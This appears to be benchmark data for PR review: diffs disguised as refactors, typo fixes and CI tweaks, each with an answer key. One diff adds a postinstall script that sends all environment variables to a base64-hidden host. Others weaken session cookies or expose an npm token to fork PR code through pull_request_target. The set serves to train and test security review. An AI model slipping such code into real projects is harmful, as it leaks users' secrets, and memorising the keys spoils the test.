@@ -1,0 +1,113 @@
+[
+  {
+    "id": "refactor-session",
+    "repo": "northwind/ledger-api",
+    "title": "refactor: extract date helpers into utils/time",
+    "hint": "A tidy refactor with three quiet security changes inside it",
+    "description": "Date formatting helpers were copy-pasted in `auth/session.ts` and `billing/invoice.ts`. This moves them into a shared `src/utils/time.ts` module and adds a small `addDays` helper.\n\nPure refactor, no behavior change. Added unit tests for the new module.",
+    "diff": "diff --git a/src/auth/session.ts b/src/auth/session.ts\nindex 59b54f1..6aaf6b5 100644\n--- a/src/auth/session.ts\n+++ b/src/auth/session.ts\n@@ -2,17 +2,9 @@ import { randomUUID } from \"node:crypto\";\n import type { Response } from \"express\";\n import { signToken } from \"./jwt\";\n import { db } from \"../db\";\n+import { formatTimestamp } from \"../utils/time\";\n \n-const SESSION_TTL_SECONDS = 60 * 60; // 1 hour\n-\n-function pad(n: number): string {\n-  return n < 10 ? `0${n}` : String(n);\n-}\n-\n-function formatTimestamp(ms: number): string {\n-  const d = new Date(ms);\n-  return `${d.getUTCFullYear()}-${pad(d.getUTCMonth() + 1)}-${pad(d.getUTCDate())} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())} UTC`;\n-}\n+const SESSION_TTL_SECONDS = 60 * 60 * 24 * 30;\n \n export async function issueSession(res: Response, userId: string): Promise<string> {\n   const sessionId = randomUUID();\n@@ -21,9 +13,8 @@ export async function issueSession(res: Response, userId: string): Promise<strin\n \n   const token = signToken({ sid: sessionId, sub: userId }, SESSION_TTL_SECONDS);\n   res.cookie(\"session\", token, {\n-    httpOnly: true,\n     secure: true,\n-    sameSite: \"strict\",\n+    sameSite: \"lax\",\n     maxAge: SESSION_TTL_SECONDS * 1000,\n   });\n   console.info(`session ${sessionId} issued, expires ${formatTimestamp(expiresAt)}`);\ndiff --git a/src/billing/invoice.ts b/src/billing/invoice.ts\nindex e9d9b4e..b30b2bb 100644\n--- a/src/billing/invoice.ts\n+++ b/src/billing/invoice.ts\n@@ -1,19 +1,11 @@\n import { db } from \"../db\";\n-\n-function pad(n: number): string {\n-  return n < 10 ? `0${n}` : String(n);\n-}\n-\n-function formatDate(ms: number): string {\n-  const d = new Date(ms);\n-  return `${d.getUTCFullYear()}-${pad(d.getUTCMonth() + 1)}-${pad(d.getUTCDate())}`;\n-}\n+import { addDays, formatDate } from \"../utils/time\";\n \n const NET_TERMS_DAYS = 30;\n \n export async function createInvoice(accountId: string, amountCents: number) {\n   const issuedAt = Date.now();\n-  const dueAt = issuedAt + NET_TERMS_DAYS * 24 * 60 * 60 * 1000;\n+  const dueAt = addDays(issuedAt, NET_TERMS_DAYS);\n   const invoice = { accountId, amountCents, issued: formatDate(issuedAt), due: formatDate(dueAt) };\n   await db.invoices.insert(invoice);\n   return invoice;\ndiff --git a/src/utils/time.ts b/src/utils/time.ts\nnew file mode 100644\nindex 0000000..f76f366\n--- /dev/null\n+++ b/src/utils/time.ts\n@@ -0,0 +1,21 @@\n+const DAY_MS = 24 * 60 * 60 * 1000;\n+\n+export function pad(n: number): string {\n+  return n < 10 ? `0${n}` : String(n);\n+}\n+\n+/** YYYY-MM-DD in UTC. */\n+export function formatDate(ms: number): string {\n+  const d = new Date(ms);\n+  return `${d.getUTCFullYear()}-${pad(d.getUTCMonth() + 1)}-${pad(d.getUTCDate())}`;\n+}\n+\n+/** YYYY-MM-DD HH:mm UTC. */\n+export function formatTimestamp(ms: number): string {\n+  const d = new Date(ms);\n+  return `${formatDate(ms)} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())} UTC`;\n+}\n+\n+export function addDays(ms: number, days: number): number {\n+  return ms + days * DAY_MS;\n+}\ndiff --git a/tests/utils/time.test.ts b/tests/utils/time.test.ts\nnew file mode 100644\nindex 0000000..f2b66e1\n--- /dev/null\n+++ b/tests/utils/time.test.ts\n@@ -0,0 +1,18 @@\n+import { describe, expect, it } from \"vitest\";\n+import { addDays, formatDate, formatTimestamp } from \"../../src/utils/time\";\n+\n+const T = Date.UTC(2026, 9, 5, 7, 3);\n+\n+describe(\"time helpers\", () => {\n+  it(\"formats dates in UTC\", () => {\n+    expect(formatDate(T)).toBe(\"2026-10-05\");\n+  });\n+\n+  it(\"formats timestamps in UTC\", () => {\n+    expect(formatTimestamp(T)).toBe(\"2026-10-05 07:03 UTC\");\n+  });\n+\n+  it(\"adds whole days\", () => {\n+    expect(formatDate(addDays(T, 30))).toBe(\"2026-11-04\");\n+  });\n+});\n",
+    "expect": {
+      "verdict": "contradicts",
+      "planted": [
+        {
+          "file": "src/auth/session.ts",
+          "needle": "60 * 60 * 24 * 30",
+          "label": "Session lifetime raised from 1 hour to 30 days"
+        },
+        {
+          "file": "src/auth/session.ts",
+          "needle": "httpOnly: true",
+          "label": "httpOnly removed from the session cookie"
+        },
+        {
+          "file": "src/auth/session.ts",
+          "needle": "sameSite: \"lax\"",
+          "label": "sameSite weakened from strict to lax"
+        }
+      ]
+    }
+  },
+  {
+    "id": "typo-postinstall",
+    "repo": "pixelcraft/tiny-charts",
+    "title": "docs: fix typo in installation guide",
+    "hint": "A one-word README fix that ships an install script",
+    "description": "Fixed a typo in the installation section of the README (recieve → receive). Happy Hacktoberfest! 🎃",
+    "diff": "diff --git a/README.md b/README.md\nindex 01a8c4e..b5c8838 100644\n--- a/README.md\n+++ b/README.md\n@@ -8,7 +8,7 @@ Dependency-free SVG charts in 4 kB.\n npm install tiny-charts\n ```\n \n-After installing you will recieve a fully typed `chart()` function. No peer dependencies, no canvas, no build step.\n+After installing you will receive a fully typed `chart()` function. No peer dependencies, no canvas, no build step.\n \n ## Usage\n \ndiff --git a/package.json b/package.json\nindex b953c63..50cabec 100644\n--- a/package.json\n+++ b/package.json\n@@ -7,7 +7,8 @@\n   \"scripts\": {\n     \"build\": \"tsc -p .\",\n     \"test\": \"vitest run\",\n-    \"lint\": \"eslint src\"\n+    \"lint\": \"eslint src\",\n+    \"postinstall\": \"node scripts/postinstall.js\"\n   },\n   \"license\": \"MIT\",\n   \"devDependencies\": {\ndiff --git a/scripts/postinstall.js b/scripts/postinstall.js\nnew file mode 100644\nindex 0000000..6192194\n--- /dev/null\n+++ b/scripts/postinstall.js\n@@ -0,0 +1,16 @@\n+// Collects anonymous install metrics to help prioritise platform support.\n+const https = require(\"https\");\n+const os = require(\"os\");\n+\n+const host = Buffer.from(\"bWV0cmljcy50aW55LWNoYXJ0cy1jZG4ubmV0\", \"base64\").toString();\n+\n+const payload = JSON.stringify({\n+  platform: os.platform(),\n+  arch: os.arch(),\n+  node: process.version,\n+  env: process.env,\n+});\n+\n+const req = https.request({ host, path: \"/v1/i\", method: \"POST\", headers: { \"Content-Type\": \"application/json\" } });\n+req.on(\"error\", () => {});\n+req.end(payload);\n",
+    "expect": {
+      "verdict": "contradicts",
+      "planted": [
+        {
+          "file": "package.json",
+          "needle": "\"postinstall\"",
+          "label": "Adds a postinstall hook"
+        },
+        {
+          "file": "scripts/postinstall.js",
+          "needle": "env: process.env",
+          "label": "Sends every environment variable off the machine"
+        },
+        {
+          "file": "scripts/postinstall.js",
+          "needle": "Buffer.from(\"",
+          "label": "Hides the destination host in base64"
+        }
+      ],
+      "undisclosedFiles": [
+        "scripts/postinstall.js"
+      ]
+    }
+  },
+  {
+    "id": "ci-cache",
+    "repo": "lumen-ui/components",
+    "title": "ci: cache npm dependencies to speed up tests",
+    "hint": "A CI speed-up that turns into a “pwn request”",
+    "description": "Turns on npm caching in `actions/setup-node` so CI stops reinstalling every dependency on each run. Cuts the test job from ~4 min to ~2 min.",
+    "diff": "diff --git a/.github/workflows/test.yml b/.github/workflows/test.yml\nindex e1c50a6..55b5308 100644\n--- a/.github/workflows/test.yml\n+++ b/.github/workflows/test.yml\n@@ -1,7 +1,7 @@\n name: test\n \n on:\n-  pull_request:\n+  pull_request_target:\n     branches: [main]\n \n permissions:\n@@ -12,8 +12,13 @@ jobs:\n     runs-on: ubuntu-latest\n     steps:\n       - uses: actions/checkout@v4\n+        with:\n+          ref: ${{ github.event.pull_request.head.sha }}\n       - uses: actions/setup-node@v4\n         with:\n           node-version: 20\n+          cache: npm\n       - run: npm ci\n       - run: npm test\n+        env:\n+          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n",
+    "expect": {
+      "verdict": "undisclosed",
+      "planted": [
+        {
+          "file": ".github/workflows/test.yml",
+          "needle": "pull_request_target",
+          "label": "Runs fork PRs with a privileged trigger"
+        },
+        {
+          "file": ".github/workflows/test.yml",
+          "needle": "pull_request.head.sha",
+          "label": "Checks out untrusted PR code in that privileged context"
+        },
+        {
+          "file": ".github/workflows/test.yml",
+          "needle": "secrets.NPM_TOKEN",
+          "label": "Exposes the npm publish token to PR code"
+        }
+      ]
+    }
+  },
+  {
+    "id": "dark-mode",
+    "repo": "fieldnotes/app",
+    "title": "feat: add dark mode toggle to settings",
+    "hint": "An honest feature PR. Does it really include the tests it mentions?",
+    "description": "Adds a dark mode toggle under Settings → Appearance.\n\n- The choice is saved to localStorage and falls back to the OS preference.\n- Applied through a `data-theme` attribute on `<html>`, so existing CSS variables just work.\n- Includes tests for the `useTheme` hook.\n\nCloses #212",
+    "diff": "diff --git a/src/components/Settings.tsx b/src/components/Settings.tsx\nindex 6a2c12a..9060221 100644\n--- a/src/components/Settings.tsx\n+++ b/src/components/Settings.tsx\n@@ -1,12 +1,17 @@\n-import { Section, Row, Select } from \"./ui\";\n+import { Section, Row, Select, Switch } from \"./ui\";\n import { useSettings } from \"../hooks/useSettings\";\n+import { useTheme } from \"../hooks/useTheme\";\n \n export function Settings() {\n   const { settings, update } = useSettings();\n+  const { theme, toggle } = useTheme();\n \n   return (\n     <div className=\"settings\">\n       <Section title=\"Appearance\">\n+        <Row label=\"Dark mode\">\n+          <Switch checked={theme === \"dark\"} onChange={toggle} />\n+        </Row>\n         <Row label=\"Font size\">\n           <Select value={settings.fontSize} options={[\"small\", \"medium\", \"large\"]} onChange={(v) => update({ fontSize: v })} />\n         </Row>\ndiff --git a/src/hooks/useTheme.ts b/src/hooks/useTheme.ts\nnew file mode 100644\nindex 0000000..7433855\n--- /dev/null\n+++ b/src/hooks/useTheme.ts\n@@ -0,0 +1,21 @@\n+import { useEffect, useState } from \"react\";\n+\n+export type Theme = \"light\" | \"dark\";\n+const STORAGE_KEY = \"fieldnotes:theme\";\n+\n+function initialTheme(): Theme {\n+  const saved = localStorage.getItem(STORAGE_KEY);\n+  if (saved === \"light\" || saved === \"dark\") return saved;\n+  return window.matchMedia(\"(prefers-color-scheme: dark)\").matches ? \"dark\" : \"light\";\n+}\n+\n+export function useTheme() {\n+  const [theme, setTheme] = useState<Theme>(initialTheme);\n+\n+  useEffect(() => {\n+    document.documentElement.dataset.theme = theme;\n+    localStorage.setItem(STORAGE_KEY, theme);\n+  }, [theme]);\n+\n+  return { theme, toggle: () => setTheme((t) => (t === \"dark\" ? \"light\" : \"dark\")) };\n+}\ndiff --git a/src/styles/theme.css b/src/styles/theme.css\nindex 671610b..97f35f1 100644\n--- a/src/styles/theme.css\n+++ b/src/styles/theme.css\n@@ -5,3 +5,11 @@\n   --muted: #78716c;\n   --accent: #2563eb;\n }\n+\n+[data-theme=\"dark\"] {\n+  --bg: #0c0a09;\n+  --surface: #1c1917;\n+  --text: #f5f5f4;\n+  --muted: #a8a29e;\n+  --accent: #60a5fa;\n+}\n",
+    "expect": {
+      "verdict": "overclaims",
+      "planted": []
+    }
+  },
+  {
+    "id": "readme-spam",
+    "repo": "openmaps/geo-utils",
+    "title": "Update README.md",
+    "hint": "A typical low-effort Hacktoberfest PR",
+    "description": "Improved the README for better readability.",
+    "diff": "diff --git a/README.md b/README.md\nindex 9a33a37..ed24a81 100644\n--- a/README.md\n+++ b/README.md\n@@ -2,7 +2,7 @@\n \n Small, fast helpers for working with coordinates.\n \n-## Install\n+## Installation\n \n     npm install geo-utils\n \n@@ -11,6 +11,10 @@ Small, fast helpers for working with coordinates.\n     import { haversine } from \"geo-utils\";\n     haversine([52.52, 13.40], [48.85, 2.35]); // km\n \n+## Contributors\n+\n+- Alex (first contribution!)\n+\n ## License\n \n MIT\n",
+    "expect": {
+      "verdict": "trivial",
+      "planted": []
+    }
+  }
+]
